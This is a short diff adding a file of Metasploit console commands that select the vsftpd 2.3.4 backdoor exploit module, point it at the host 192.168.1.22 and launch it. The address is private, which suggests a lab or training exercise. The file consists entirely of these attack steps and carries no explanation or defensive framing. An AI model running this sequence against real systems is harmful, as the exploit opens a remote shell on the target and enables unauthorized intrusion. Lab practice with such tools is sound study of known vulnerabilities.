@@ -1,0 +1,9 @@
+msfconsole
+
+use exploit/unix/ftp/vsftpd_234_backdoor 
+
+set RHOST 192.168.1.22
+
+show options
+
+exploit
